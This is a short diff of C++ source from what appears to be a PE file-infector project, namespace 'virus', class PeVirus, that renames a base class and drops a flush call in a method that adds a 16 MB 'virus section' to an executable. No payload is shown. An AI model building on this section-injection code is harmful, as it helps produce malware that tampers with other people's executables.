@@ -3,14 +3,14 @@
 namespace virus
 {
     PeVirus::PeVirus(const std::string_view &full_path):
-        PortableExecution(full_path)
+        PortableExecutable(full_path)
     {
         
     }
 
     void PeVirus::AddVirusSection(const std::vector<unsigned char> &section_data)
     {
-        std::vector<unsigned char> data = this->pe::PortableExecution::GetData();
+        std::vector<unsigned char> data = this->pe::PortableExecutable::GetData();
         DWORD data_size = (DWORD)data.size();
         data.resize(data_size + 0x1000000); // + 16 Mb
 
@@ -23,8 +23,7 @@ namespace virus
 
         data.resize(data_size);
 
-        this->pe::PortableExecution::SetData(data);
-        this->pe::PortableExecution::FlushChange();
+        this->pe::PortableExecutable::SetData(data);
     }
 }
 
